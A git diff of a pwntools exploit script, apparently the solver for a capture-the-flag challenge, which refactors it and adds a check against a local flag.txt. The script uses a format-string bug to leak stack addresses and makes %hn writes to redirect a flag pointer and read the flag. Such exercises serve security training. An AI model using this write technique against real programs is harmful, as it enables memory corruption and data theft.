@@ -17,6 +17,7 @@ context.terminal = ["alacritty", "-e"]
 host = args.HOST or "localhost"
 port = int(args.PORT or 14002)
 
+
 def start_local(argv=[], *a, **kw):
     """Execute the target binary locally"""
     if args.GDB:
@@ -76,7 +77,7 @@ def send_payload(io: process | connect, _payload: bytes, newline: bool = True) -
         recv = io.recvuntil(b"\n", drop=True)
     else:
         recv = io.recvuntil(b"n1k0", drop=True)
-    return recv 
+    return recv
 
 
 def get_stack_var(io: process | connect, index: int) -> bytes:
@@ -89,62 +90,71 @@ def read_flag(io: process | connect):
     return
 
 
-io = start()
+def exploit() -> bool:
+    io = start()
 
-# leaking all the stack vars
-#for i in range(1, 50):
-#    leak = get_stack_var(io, i)
-#    print(leak)
-#    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii').strip()}.")
+    # leaking all the stack vars
+    # for i in range(1, 50):
+    #    leak = get_stack_var(io, i)
+    #    print(leak)
+    #    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii').strip()}.")
 
-# stack indices
-indices = {"rbp": 22, "flag": 7, "buffer": 8}
-indices["gadget"] = indices["buffer"] + 2 # where the gadget lives
-indices["target"] = indices["gadget"] + 2 # where the flag is to be read
-addrs = {"rbp": 0, "flag": 0, "buffer": 0}
+    # stack indices
+    indices = {"rbp": 22, "flag": 7, "buffer": 8}
+    indices["gadget"] = indices["buffer"] + 2  # where the gadget lives
+    indices["target"] = indices["gadget"] + 2  # where the flag is to be read
+    addrs = {"rbp": 0, "flag": 0, "buffer": 0}
 
-# calculate addresses
-addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xb0
-addrs["flag"] = addrs["rbp"] - 0x78
-addrs["buffer"] = addrs["rbp"] - 0x70
-io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
-io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
-io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")
+    # calculate addresses
+    addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xB0
+    addrs["flag"] = addrs["rbp"] - 0x78
+    addrs["buffer"] = addrs["rbp"] - 0x70
+    io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
+    io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
+    io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")
 
-## do exploit
-addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
-addrs["target"] = addrs["buffer"] + (8 * (indices["target"] - indices["buffer"]))
-io.info(
-    f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
-)
+    ## do exploit
+    addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
+    addrs["target"] = addrs["buffer"] + (8 * (indices["target"] - indices["buffer"]))
+    io.info(
+        f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
+    )
 
-# the address of the gadget
-_t = pack(addrs["target"])
-shorts = [_t[i : i + 2] for i in range(0, len(_t), 2)]
-for i, short in enumerate(shorts, 0):
-    # writing the gadget onto the stack
-    payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8)
-    payload += pack(addrs["flag"] + (i * 2))
-    send_payload(io, payload, False)
+    # the address of the gadget
+    _t = pack(addrs["target"])
+    shorts = [_t[i : i + 2] for i in range(0, len(_t), 2)]
+    for i, short in enumerate(shorts, 0):
+        # writing the gadget onto the stack
+        payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8)
+        payload += pack(addrs["flag"] + (i * 2))
+        send_payload(io, payload, False)
 
-    # use that gadget to overwrite the flag ptr
-    payload = ""
-    if unpack(short, "all") > 0:
-        payload = f"%{unpack(short, 'all')}c"
-    payload += f"%{indices['gadget']}$hn"
-    send_payload(io, payload.encode("ascii"))
+        # use that gadget to overwrite the flag ptr
+        payload = ""
+        if unpack(short, "all") > 0:
+            payload = f"%{unpack(short, 'all')}c"
+        payload += f"%{indices['gadget']}$hn"
+        send_payload(io, payload.encode("ascii"))
 
-# reading the flag
-read_flag(io)
+    # reading the flag
+    read_flag(io)
 
-# reconstructing the flag
-parts = []
-for i in range(0, 4):
-    parts.append(get_stack_var(io, indices["target"] + i)[:16])
+    # reconstructing the flag
+    parts = []
+    for i in range(0, 4):
+        parts.append(get_stack_var(io, indices["target"] + i)[:16])
 
-flag = "".join(
-    map(lambda x: bytes.fromhex(x.decode("ascii")).decode("utf-8")[::-1], parts)
-)
+    flag = "".join(
+        map(lambda x: bytes.fromhex(x.decode("ascii")).decode("utf-8")[::-1], parts)
+    )
 
-io.success(f"Flag is: {flag}")
+    with open("./flag.txt", "r") as f_in:
+        buf = f_in.readline().strip()
+        if buf in flag:
+            io.success(f"Flag: {flag}")
+            return True
+        return False
 
+
+if __name__ == "__main__":
+    exit(exploit())
